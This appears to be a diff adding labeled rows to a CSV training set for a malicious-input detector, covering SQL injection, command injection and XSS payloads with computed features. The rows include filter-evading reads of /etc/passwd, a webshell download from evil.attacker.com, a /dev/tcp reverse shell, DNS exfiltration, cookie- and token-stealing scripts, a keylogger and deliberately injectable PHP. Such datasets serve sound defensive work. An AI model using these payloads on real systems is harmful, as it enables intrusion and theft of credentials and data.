+%0C,STRING,MALICIOUS,LOW,1.585,0.0,0,0,1,0.1,0,0,0,0,0.3333,0.3333,0.3333,sql_injection
+?id=1%0Dand%0D1=1%0D--,STRING,MALICIOUS,LOW,3.3222,0.0,0,0,1,0.1,0,0,0,0,0.2727,0.1364,0.3636,sql_injection
+%0D,STRING,MALICIOUS,LOW,1.585,0.0,0,0,1,0.1,0,0,0,0,0.3333,0.3333,0.3333,sql_injection
+\\r,STRING,MALICIOUS,LOW,1.0,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.5,sql_injection
+?id=1%A0and%A01=1%A0--,STRING,MALICIOUS,LOW,3.3222,0.0,0,0,1,0.1,0,0,0,0,0.2727,0.1364,0.3636,sql_injection
+%A0,STRING,MALICIOUS,LOW,1.585,0.0,0,0,1,0.1,0,0,0,0,0.3333,0.3333,0.3333,sql_injection
+?id=1/*comment*/AND/**/1=1/**/--,STRING,MALICIOUS,LOW,3.6945,0.0,0,0,1,0.3,0,0,0,0,0.0938,0.0938,0.5312,sql_injection
+?id=1/*!12345UNION*//*!12345SELECT*/1--,STRING,MALICIOUS,LOW,4.2598,0.0,0,0,1,0.35,0,1,0,0,0.3077,0.2821,0.359,sql_injection
+?id=(1)and(1)=(1)--,STRING,MALICIOUS,LOW,3.1814,0.0,0,0,1,0.1,0,0,0,0,0.1579,0.0,0.5789,sql_injection
+OFFSET,STRING,MALICIOUS,LOW,2.2516,0.0,0,0,1,0.1,0,0,0,0,0.0,1.0,0.0,sql_injection
+FROM,STRING,MALICIOUS,LOW,2.0,0.0,0,0,1,0.15,0,1,0,0,0.0,1.0,0.0,sql_injection
+JOIN,STRING,MALICIOUS,LOW,2.0,0.0,0,0,1,0.1,0,0,0,0,0.0,1.0,0.0,sql_injection
+"LIMIT 0,1",STRING,MALICIOUS,LOW,2.9477,0.0,0,0,1,0.1,0,0,0,0,0.2222,0.5556,0.2222,sql_injection
+LIMIT 1 OFFSET 0,STRING,MALICIOUS,LOW,3.3278,0.0,0,0,1,0.1,0,0,0,0,0.125,0.6875,0.1875,sql_injection
+"SUBSTR('SQL',1,1)",STRING,MALICIOUS,LOW,3.4548,0.0,0,0,1,0.1,0,0,0,0,0.1176,0.5294,0.3529,sql_injection
+SUBSTR('SQL' FROM 1 FOR 1),STRING,MALICIOUS,LOW,3.7193,0.0,0,0,1,0.35,0,1,0,0,0.0769,0.6154,0.3077,sql_injection
+"SELECT 1,2,3,4",STRING,MALICIOUS,LOW,3.3249,0.0,0,0,1,0.15,0,1,0,0,0.2857,0.4286,0.2857,sql_injection
+LIKE,STRING,MALICIOUS,LOW,2.0,0.0,0,0,1,0.1,0,0,0,0,0.0,1.0,0.0,sql_injection
+"SUBSTRING(VERSION(),1,1)LIKE(5)",STRING,MALICIOUS,LOW,4.0181,0.0,0,0,1,0.3,0,0,0,0,0.0968,0.6452,0.2581,sql_injection
+NOT IN,STRING,MALICIOUS,LOW,2.2516,0.0,0,0,1,0.1,0,0,0,0,0.0,0.8333,0.1667,sql_injection
+"SUBSTRING(VERSION(),1,1)NOT IN(4,3)",STRING,MALICIOUS,LOW,3.9929,0.0,0,0,1,0.3,0,0,0,0,0.1143,0.6,0.2857,sql_injection
+IN,STRING,MALICIOUS,LOW,1.0,0.0,0,0,1,0.1,0,0,0,0,0.0,1.0,0.0,sql_injection
+"SUBSTRING(VERSION(),1,1)IN(4,3)",STRING,MALICIOUS,LOW,3.9049,0.0,0,0,1,0.3,0,0,0,0,0.129,0.5806,0.2903,sql_injection
+BETWEEN,STRING,MALICIOUS,LOW,2.1281,0.0,0,0,1,0.1,0,0,0,0,0.0,1.0,0.0,sql_injection
+"SUBSTRING(VERSION(),1,1) BETWEEN 3 AND 4",STRING,MALICIOUS,LOW,4.2031,0.0,0,0,1,0.3,0,0,0,0,0.1,0.65,0.25,sql_injection
+AND,STRING,MALICIOUS,LOW,1.585,0.0,0,0,1,0.1,0,0,0,0,0.0,1.0,0.0,sql_injection
+aNd,STRING,MALICIOUS,LOW,1.585,0.0,0,0,1,0.1,0,0,0,0,0.0,0.3333,0.0,sql_injection
+&&,STRING,MALICIOUS,LOW,-0.0,0.0,0,0,0,0.3,0,0,1,0,0.0,0.0,1.0,sql_injection
+OR,STRING,MALICIOUS,LOW,1.0,0.0,0,0,1,0.1,0,0,0,0,0.0,1.0,0.0,sql_injection
+\\|\\|,STRING,MALICIOUS,LOW,1.0,0.0,0,0,0,0.1,0,0,0,0,0.0,0.0,1.0,sql_injection
+WHERE,STRING,MALICIOUS,LOW,1.9219,0.0,0,0,1,0.15,0,1,0,0,0.0,1.0,0.0,sql_injection
+HAVING,STRING,MALICIOUS,LOW,2.585,0.0,0,0,1,0.1,0,0,0,0,0.0,1.0,0.0,sql_injection
+<?php,STRING,MALICIOUS,LOW,1.9219,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.4,command_injection
+$ip = $_GET['ip'];,STRING,MALICIOUS,LOW,3.6144,0.0,0,0,1,0.5,1,0,1,0,0.0,0.1667,0.6111,command_injection
+"system(""ping -c 4 "" . $ip);",STRING,MALICIOUS,LOW,4.0286,0.0,0,0,1,0.8,1,0,1,1,0.037,0.0,0.4815,command_injection
+cat /etc/passwd,STRING,MALICIOUS,LOW,3.2402,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.2,command_injection
+root:x:0:0:root:/root:/bin/bash,STRING,MALICIOUS,LOW,3.3644,0.0,0,0,1,0.3,0,0,1,0,0.0645,0.0,0.2903,command_injection
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh,STRING,MALICIOUS,LOW,3.7969,0.0,0,0,1,0.3,0,0,0,0,0.0541,0.0,0.2703,command_injection
+bin:x:2:2:bin:/bin:/bin/sh,STRING,MALICIOUS,LOW,2.921,0.0,0,0,1,0.1,0,0,0,0,0.0769,0.0,0.3462,command_injection
+sys:x:3:3:sys:/dev:/bin/sh,STRING,MALICIOUS,LOW,3.3207,0.0,0,0,1,0.1,0,0,0,0,0.0769,0.0,0.3462,command_injection
+...,STRING,MALICIOUS,LOW,-0.0,0.0,0,0,0,0.1,0,0,0,0,0.0,0.0,1.0,command_injection
+command1; command2   # Execute command1 and then command2,STRING,MALICIOUS,LOW,3.6992,0.0,0,0,1,0.8,1,0,1,1,0.0702,0.0175,0.193,command_injection
+command1 && command2 # Execute command2 only if command1 succeeds,STRING,MALICIOUS,LOW,3.9761,0.0,0,0,1,0.8,1,0,1,1,0.0615,0.0154,0.1846,command_injection
+command1 || command2 # Execute command2 only if command1 fails,STRING,MALICIOUS,LOW,4.0031,0.0,0,0,1,0.8,1,0,1,1,0.0645,0.0161,0.1935,command_injection
+command1 & command2  # Execute command1 in the background,STRING,MALICIOUS,LOW,4.0432,0.0,0,0,1,0.5,1,0,0,1,0.0526,0.0175,0.193,command_injection
+command1 | command2  # Pipe the output of command1 into command2,STRING,MALICIOUS,LOW,3.8545,0.0,0,0,1,0.3,0,0,0,0,0.0625,0.0156,0.2031,command_injection
+"chrome '--gpu-launcher=""id>/tmp/foo""'",STRING,MALICIOUS,LOW,4.4119,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0,0.3243,command_injection
+"ssh '-oProxyCommand=""touch /tmp/foo""' foo@foo",STRING,MALICIOUS,LOW,4.17,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0444,0.2667,command_injection
+psql -o'|id>/tmp/foo',STRING,MALICIOUS,LOW,3.8802,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0,0.381,command_injection
+"$url = ""https://example.tld/"" . $_GET['path'] . "".txt"";",STRING,MALICIOUS,LOW,4.4489,0.0,0,0,1,0.5,1,0,1,0,0.0,0.0545,0.4909,command_injection
+"system(""wget.exe -q "" . escapeshellarg($url));",STRING,MALICIOUS,LOW,4.2973,0.0,0,0,1,0.8,1,0,1,1,0.0,0.0,0.3261,command_injection
+curl http://evil.attacker.com/ -o webshell.php,STRING,MALICIOUS,LOW,4.2512,0.0,0,0,1,0.5,1,0,1,0,0.0,0.0,0.2391,command_injection
+original_cmd_by_server `cat /etc/passwd`,STRING,MALICIOUS,LOW,4.3087,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0,0.225,command_injection
+original_cmd_by_server $(cat /etc/passwd),STRING,MALICIOUS,LOW,4.4178,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0,0.2439,command_injection
+cat${IFS}/etc/passwd,STRING,MALICIOUS,LOW,3.8219,0.0,0,0,1,0.3,0,0,0,0,0.0,0.15,0.25,command_injection
+ls${IFS}-la,STRING,MALICIOUS,LOW,3.2776,0.0,0,0,1,0.1,0,0,0,0,0.0,0.2727,0.3636,command_injection
+"{cat,/etc/passwd}",STRING,MALICIOUS,LOW,3.4992,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.2941,command_injection
+cat</etc/passwd,STRING,MALICIOUS,LOW,3.2402,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.2,command_injection
+sh</dev/tcp/127.0.0.1/4242,STRING,MALICIOUS,LOW,3.7962,0.0,0,0,1,0.3,0,0,0,0,0.3846,0.0,0.3077,command_injection
+X=$'uname\\x20-a'&&$X,STRING,MALICIOUS,LOW,3.8219,0.0,0,0,1,0.5,1,0,1,0,0.1,0.1,0.45,command_injection
+;ls%09-al%09/home,STRING,MALICIOUS,LOW,3.6169,0.0,0,0,1,0.5,1,0,1,0,0.2353,0.0,0.2941,command_injection
+"ping%CommonProgramFiles:~10,-18%127.0.0.1",STRING,MALICIOUS,LOW,4.4546,0.0,0,0,1,0.3,0,0,0,0,0.2439,0.0732,0.2195,command_injection
+"ping%PROGRAMFILES:~10,-5%127.0.0.1",STRING,MALICIOUS,LOW,4.5503,0.0,0,0,1,0.3,0,0,0,0,0.2647,0.3529,0.2647,command_injection
+original_cmd_by_server,STRING,MALICIOUS,LOW,3.8454,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0,0.1364,command_injection
+$ cat /et\\,STRING,MALICIOUS,LOW,2.9219,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.5,command_injection
+c/pa\\,STRING,MALICIOUS,LOW,2.3219,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.4,command_injection
+sswd,STRING,MALICIOUS,LOW,1.5,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.0,command_injection
+cat%20/et%5C%0Ac/pa%5C%0Asswd,STRING,MALICIOUS,LOW,3.742,0.0,0,0,1,0.3,0,0,0,0,0.2069,0.1379,0.2414,command_injection
+echo ~+,STRING,MALICIOUS,LOW,2.8074,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.4286,command_injection
+echo ~-,STRING,MALICIOUS,LOW,2.8074,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.4286,command_injection
+"{,ip,a}",STRING,MALICIOUS,LOW,2.5216,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.5714,command_injection
+"{,ifconfig}",STRING,MALICIOUS,LOW,3.0958,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.2727,command_injection
+"{,ifconfig,eth0}",STRING,MALICIOUS,LOW,3.625,0.0,0,0,1,0.3,0,0,0,0,0.0625,0.0,0.25,command_injection
+"{l,-lh}s",STRING,MALICIOUS,LOW,2.75,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.5,command_injection
+"{,echo,#test}",STRING,MALICIOUS,LOW,3.2389,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.3846,command_injection
+"{,$""whoami"",}",STRING,MALICIOUS,LOW,3.3927,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.5385,command_injection
+"{,/?s?/?i?/c?t,/e??/p??s??,}",STRING,MALICIOUS,LOW,2.7924,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.75,command_injection
+swissky@crashlab:~$ echo ${HOME:0:1},STRING,MALICIOUS,LOW,4.5378,0.0,0,0,1,0.3,0,0,0,0,0.0556,0.1111,0.3056,command_injection
+swissky@crashlab:~$ cat ${HOME:0:1}etc${HOME:0:1}passwd,STRING,MALICIOUS,LOW,4.5699,0.0,0,0,1,0.3,0,0,0,0,0.0727,0.1455,0.2909,command_injection
+"swissky@crashlab:~$ echo . | tr '!-0' '""-1'",STRING,MALICIOUS,LOW,4.4609,0.0,0,0,1,0.3,0,0,0,0,0.0465,0.0,0.4651,command_injection
+"swissky@crashlab:~$ tr '!-0' '""-1' <<< .",STRING,MALICIOUS,LOW,4.3628,0.0,0,0,1,0.3,0,0,0,0,0.05,0.0,0.525,command_injection
+"swissky@crashlab:~$ cat $(echo . | tr '!-0' '""-1')etc$(echo . | tr '!-0' '""-1')passwd",STRING,MALICIOUS,LOW,4.5605,0.0,0,0,1,0.3,0,0,0,0,0.0471,0.0,0.4941,command_injection
+"swissky@crashlab:~$ echo -e ""\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64""",STRING,MALICIOUS,LOW,4.4104,0.0,0,0,1,0.3,0,0,0,0,0.2703,0.0,0.2838,command_injection
+/etc/passwd,STRING,MALICIOUS,LOW,3.0958,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.1818,command_injection
+"swissky@crashlab:~$ cat `echo -e ""\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64""`",STRING,MALICIOUS,LOW,4.5234,0.0,0,0,1,0.3,0,0,0,0,0.25,0.0,0.3,command_injection
+swissky@crashlab:~$ abc=$'\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64';cat $abc,STRING,MALICIOUS,LOW,4.4283,0.0,0,0,1,0.5,1,0,1,0,0.25,0.0,0.2875,command_injection
+swissky@crashlab:~$ `echo $'cat\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64'`,STRING,MALICIOUS,LOW,4.4563,0.0,0,0,1,0.3,0,0,0,0,0.2716,0.0,0.284,command_injection
+swissky@crashlab:~$ xxd -r -p <<< 2f6574632f706173737764,STRING,MALICIOUS,LOW,4.6175,0.0,0,0,1,0.3,0,0,0,0,0.3571,0.0,0.25,command_injection
+swissky@crashlab:~$ cat `xxd -r -p <<< 2f6574632f706173737764`,STRING,MALICIOUS,LOW,4.7077,0.0,0,0,1,0.3,0,0,0,0,0.3226,0.0,0.2742,command_injection
+swissky@crashlab:~$ xxd -r -ps <(echo 2f6574632f706173737764),STRING,MALICIOUS,LOW,4.7917,0.0,0,0,1,0.3,0,0,0,0,0.3279,0.0,0.2295,command_injection
+swissky@crashlab:~$ cat `xxd -r -ps <(echo 2f6574632f706173737764)`,STRING,MALICIOUS,LOW,4.8587,0.0,0,0,1,0.3,0,0,0,0,0.2985,0.0,0.2537,command_injection
+w'h'o'am'i,STRING,MALICIOUS,LOW,2.5219,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.4,command_injection
+wh''oami,STRING,MALICIOUS,LOW,2.75,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.25,command_injection
+'w'hoami,STRING,MALICIOUS,LOW,2.75,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.25,command_injection
+"w""h""o""am""i",STRING,MALICIOUS,LOW,2.5219,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.4,command_injection
+"wh""""oami",STRING,MALICIOUS,LOW,2.75,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.25,command_injection
+"""wh""oami",STRING,MALICIOUS,LOW,2.75,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.25,command_injection
+wh``oami,STRING,MALICIOUS,LOW,2.75,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.25,command_injection
+w\\ho\\am\\i,STRING,MALICIOUS,LOW,2.6416,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.3333,command_injection
+/\\b\\i\\n/////s\\h,STRING,MALICIOUS,LOW,2.3396,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.6667,command_injection
+who$@ami,STRING,MALICIOUS,LOW,3.0,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.25,command_injection
+echo whoami|$0,STRING,MALICIOUS,LOW,3.5216,0.0,0,0,1,0.3,0,0,0,0,0.0714,0.0,0.2143,command_injection
+who$()ami,STRING,MALICIOUS,LOW,3.1699,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.3333,command_injection
+who$(echo am)i,STRING,MALICIOUS,LOW,3.5216,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0,0.2857,command_injection
+who`echo am`i,STRING,MALICIOUS,LOW,3.2389,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.2308,command_injection
+/???/??t /???/p??s??,STRING,MALICIOUS,LOW,1.771,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.85,command_injection
+test=/ehhh/hmtc/pahhh/hmsswd,STRING,MALICIOUS,LOW,3.182,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.1786,command_injection
+cat ${test//hhh\\/hm/},STRING,MALICIOUS,LOW,3.404,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.4286,command_injection
+cat ${test//hh??hm/},STRING,MALICIOUS,LOW,3.5087,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0,0.45,command_injection
+powershell C:\\*\\*2\\n??e*d.*? # notepad,STRING,MALICIOUS,LOW,4.1883,0.0,0,0,1,0.3,0,0,0,0,0.0263,0.0263,0.4211,command_injection
+@^p^o^w^e^r^shell c:\\*\\*32\\c*?c.e?e # calc,STRING,MALICIOUS,LOW,4.0557,0.0,0,0,1,0.3,0,0,0,0,0.0476,0.0,0.5,command_injection
+wHoAmi,STRING,MALICIOUS,LOW,2.585,0.0,0,0,1,0.1,0,0,0,0,0.0,0.3333,0.0,command_injection
+swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi,STRING,MALICIOUS,LOW,4.5974,0.0,0,0,1,0.5,1,0,1,0,0.0274,0.0,0.3836,command_injection
+real    0m5.007s,STRING,MALICIOUS,LOW,3.2028,0.0,0,0,1,0.1,0,0,0,0,0.3125,0.0,0.3125,command_injection
+user    0m0.000s,STRING,MALICIOUS,LOW,2.6494,0.0,0,0,1,0.1,0,0,0,0,0.3125,0.0,0.3125,command_injection
+sys 0m0.000s,STRING,MALICIOUS,LOW,2.2213,0.0,0,0,1,0.1,0,0,0,0,0.4167,0.0,0.1667,command_injection
+swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi,STRING,MALICIOUS,LOW,4.6064,0.0,0,0,1,0.5,1,0,1,0,0.0274,0.0,0.3836,command_injection
+real    0m0.002s,STRING,MALICIOUS,LOW,3.0,0.0,0,0,1,0.1,0,0,0,0,0.3125,0.0,0.3125,command_injection
+"for i in $(ls /) ; do host ""$i.3a43c7e4e57a8d0e2057.d.zhack.ca""; done",STRING,MALICIOUS,LOW,4.6188,0.0,0,0,1,0.5,1,0,1,0,0.1884,0.0,0.3188,command_injection
+"Payload: 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}"";sleep${IFS}9;#${IFS}",STRING,MALICIOUS,LOW,4.1875,0.0,0,0,1,0.5,1,0,1,0,0.0533,0.2533,0.4133,command_injection
+"echo 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}"";sleep${IFS}9;#${IFS}",STRING,MALICIOUS,LOW,4.009,0.0,0,0,1,0.5,1,0,1,0,0.0563,0.2535,0.4225,command_injection
+"echo '1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}"";sleep${IFS}9;#${IFS}",STRING,MALICIOUS,LOW,4.0311,0.0,0,0,1,0.5,1,0,1,0,0.0556,0.25,0.4306,command_injection
+"echo ""1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}"";sleep${IFS}9;#${IFS}",STRING,MALICIOUS,LOW,4.0311,0.0,0,0,1,0.5,1,0,1,0,0.0556,0.25,0.4306,command_injection
+"Payload: /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'""||sleep(5)||""/*`*/",STRING,MALICIOUS,LOW,4.1461,0.0,0,0,1,0.5,1,0,1,0,0.07,0.01,0.51,command_injection
+"echo 1/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'""||sleep(5)||""/*`*/",STRING,MALICIOUS,LOW,4.0357,0.0,0,0,1,0.5,1,0,1,0,0.0825,0.0,0.5155,command_injection
+"echo ""YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'""||sleep(5)||""/*`*/""",STRING,MALICIOUS,LOW,4.2882,0.0,0,0,1,0.5,1,0,1,0,0.0667,0.0667,0.4952,command_injection
+"echo 'YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'""||sleep(5)||""/*`*/'",STRING,MALICIOUS,LOW,4.2882,0.0,0,0,1,0.5,1,0,1,0,0.0667,0.0667,0.4952,command_injection
+nohup sleep 120 > /dev/null &,STRING,MALICIOUS,LOW,3.8539,0.0,0,0,1,0.3,0,0,0,0,0.1034,0.0,0.3103,command_injection
+"g=""/e""\\h""hh""/hm""t""c/\\i""sh""hh/hmsu\\e;tac$@<${g//hh??hm/}",STRING,MALICIOUS,LOW,3.8684,0.0,0,0,1,0.5,1,0,1,0,0.0,0.0,0.5091,command_injection
+system(),STRING,MALICIOUS,LOW,2.75,0.0,0,0,1,0.3,0,0,0,1,0.0,0.0,0.25,command_injection
+ping,STRING,MALICIOUS,LOW,2.0,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.0,command_injection
+ip,STRING,MALICIOUS,LOW,1.0,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.0,command_injection
+8.8.8.8; cat /etc/passwd,STRING,MALICIOUS,LOW,3.5535,0.0,0,0,1,0.5,1,0,1,0,0.1667,0.0,0.3333,command_injection
+ping -c 4 8.8.8.8; cat /etc/passwd,STRING,MALICIOUS,LOW,3.9369,0.0,0,0,1,0.5,1,0,1,0,0.1471,0.0,0.3529,command_injection
+ping 8.8.8.8,STRING,MALICIOUS,LOW,2.5221,0.0,0,0,1,0.1,0,0,0,0,0.3333,0.0,0.3333,command_injection
+||,STRING,MALICIOUS,LOW,-0.0,0.0,0,0,0,0.3,0,0,1,0,0.0,0.0,1.0,command_injection
+\uff02 --use-askpass=calc \uff02,STRING,MALICIOUS,MEDIUM,3.3908,0.0909,0,0,1,0.25,0,0,0,0,0.0,0.0,0.3636,command_injection
+$IFS,STRING,MALICIOUS,LOW,2.0,0.0,0,0,1,0.1,0,0,0,0,0.0,0.75,0.25,command_injection
+ls,STRING,MALICIOUS,LOW,1.0,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.0,command_injection
+wget,STRING,MALICIOUS,LOW,2.0,0.0,0,0,1,0.3,0,0,1,0,0.0,0.0,0.0,command_injection
+${IFS},STRING,MALICIOUS,LOW,2.585,0.0,0,0,1,0.1,0,0,0,0,0.0,0.5,0.5,command_injection
+09,STRING,MALICIOUS,LOW,1.0,0.0,0,0,0,0.1,0,0,0,0,1.0,0.0,0.0,command_injection
+"%VARIABLE:~start,length%",STRING,MALICIOUS,LOW,4.2202,0.0,0,0,1,0.3,0,0,0,0,0.0,0.3333,0.2083,command_injection
+"echo -e ""\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64""",STRING,MALICIOUS,LOW,3.5998,0.0,0,0,1,0.3,0,0,0,0,0.3704,0.0,0.2963,command_injection
+echo $'cat\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64',STRING,MALICIOUS,LOW,3.6952,0.0,0,0,1,0.3,0,0,0,0,0.3729,0.0,0.2712,command_injection
+xxd -r -p <<< 2f6574632f706173737764,STRING,MALICIOUS,LOW,3.7527,0.0,0,0,1,0.3,0,0,0,0,0.5556,0.0,0.25,command_injection
+xxd -r -ps <(echo 2f6574632f706173737764),STRING,MALICIOUS,LOW,4.2291,0.0,0,0,1,0.3,0,0,0,0,0.4878,0.0,0.2195,command_injection
+$0,STRING,MALICIOUS,LOW,1.0,0.0,0,0,0,0.1,0,0,0,0,0.5,0.0,0.5,command_injection
+echo am,STRING,MALICIOUS,LOW,2.8074,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.1429,command_injection
+DIR,STRING,MALICIOUS,LOW,1.585,0.0,0,0,1,0.1,0,0,0,0,0.0,1.0,0.0,command_injection
+dir,STRING,MALICIOUS,LOW,1.585,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.0,command_injection
+DiR,STRING,MALICIOUS,LOW,1.585,0.0,0,0,1,0.1,0,0,0,0,0.0,0.6667,0.0,command_injection
+sleep 5,STRING,MALICIOUS,LOW,2.5216,0.0,0,0,1,0.1,0,0,0,0,0.1429,0.0,0.1429,command_injection
+*/-sleep(5)-'/*$(sleep 5),STRING,MALICIOUS,LOW,3.6039,0.0,0,0,1,0.3,0,0,0,0,0.08,0.0,0.52,command_injection
+"#*/-sleep(5)||'""||sleep(5)||""/*",STRING,MALICIOUS,LOW,3.6152,0.0,0,0,1,0.5,1,0,1,0,0.0645,0.0,0.6129,command_injection
+nohup,STRING,MALICIOUS,LOW,2.3219,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.0,command_injection
+--,STRING,MALICIOUS,LOW,-0.0,0.0,0,0,0,0.1,0,0,0,0,0.0,0.0,1.0,command_injection
+<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>,STRING,MALICIOUS,LOW,4.5759,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0341,0.2159,xss
+<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>,STRING,MALICIOUS,LOW,4.6551,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0459,0.2202,xss
+"<script>new Image().src=""http://localhost/cookie.php?c=""+document.cookie;</script>",STRING,MALICIOUS,LOW,4.6668,0.0,0,0,1,0.5,1,0,1,0,0.0,0.0122,0.2683,xss
+"<script>new Image().src=""http://localhost/cookie.php?c=""+localStorage.getItem('access_token');</script>",STRING,MALICIOUS,LOW,4.7015,0.0,0,0,1,0.5,1,0,1,0,0.0,0.0291,0.2621,xss
+$cookie = $_GET['c'];,STRING,MALICIOUS,LOW,3.9161,0.0,0,0,1,0.5,1,0,1,0,0.0,0.1429,0.5238,xss
+"$fp = fopen('cookies.txt', 'a+');",STRING,MALICIOUS,LOW,4.2714,0.0,0,0,1,0.5,1,0,1,0,0.0,0.0,0.4545,xss
+"fwrite($fp, 'Cookie:' .$cookie.""\\r\\n"");",STRING,MALICIOUS,LOW,4.3749,0.0,0,0,1,0.5,1,0,1,0,0.0,0.0256,0.4359,xss
+fclose($fp);,STRING,MALICIOUS,LOW,3.4183,0.0,0,0,1,0.3,0,0,1,0,0.0,0.0,0.3333,xss
+<script>,STRING,MALICIOUS,LOW,3.0,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.25,xss
+"fetch('https://<SESSION>.burpcollaborator.net', {",STRING,MALICIOUS,LOW,4.6785,0.0,0,0,1,0.3,0,0,0,0,0.0,0.1429,0.2653,xss
+"method: 'POST',",STRING,MALICIOUS,LOW,3.7736,0.0,0,0,1,0.3,0,0,0,0,0.0,0.2667,0.3333,xss
+"mode: 'no-cors',",STRING,MALICIOUS,LOW,3.5778,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0,0.375,xss
+body: document.cookie,STRING,MALICIOUS,LOW,3.7257,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0,0.1429,xss
+});,STRING,MALICIOUS,LOW,1.585,0.0,0,0,0,0.3,0,0,1,0,0.0,0.0,1.0,xss
+</script>,STRING,MALICIOUS,LOW,3.1699,0.0,0,0,1,0.1,0,0,0,0,0.0,0.0,0.3333,xss
+"history.replaceState(null, null, '../../../login');",STRING,MALICIOUS,LOW,4.2963,0.0,0,0,1,0.5,1,0,1,0,0.0,0.0196,0.3725,xss
+"<img src=x onerror='document.onkeypress=function(e){fetch(""http://domain.com?k=""+String.fromCharCode(e.which))},this.remove();'>",STRING,MALICIOUS,LOW,4.8951,0.0,0,0,1,0.65,1,1,1,0,0.0,0.0234,0.2656,xss
+<script>debugger;</script>,STRING,MALICIOUS,LOW,3.8253,0.0,0,0,1,0.5,1,0,1,0,0.0,0.0,0.2308,xss
+"<script>alert(document.domain.concat(""\\n"").concat(window.origin))</script>",STRING,MALICIOUS,LOW,4.3163,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0,0.2432,xss
+"<script>console.log(""Test XSS from the search bar of page XYZ\\n"".concat(document.domain).concat(""\\n"").concat(window.origin))</script>",STRING,MALICIOUS,LOW,4.6747,0.0,0,0,1,0.35,0,1,0,0,0.0,0.0526,0.2481,xss
+<script>alert('XSS')</script>,STRING,MALICIOUS,LOW,3.9783,0.0,0,0,1,0.3,0,0,0,0,0.0,0.1034,0.3103,xss
+<scr<script>ipt>alert('XSS')</scr<script>ipt>,STRING,MALICIOUS,LOW,3.8203,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0667,0.2889,xss
+"""><script>alert('XSS')</script>",STRING,MALICIOUS,LOW,4.0424,0.0,0,0,1,0.3,0,0,0,0,0.0,0.0968,0.3548,xss
+"""><script>alert(String.fromCharCode(88,83,83))</script>",STRING,MALICIOUS,LOW,4.5992,0.0,0,0,1,0.35,0,1,0,0,0.1091,0.0545,0.2545,xss
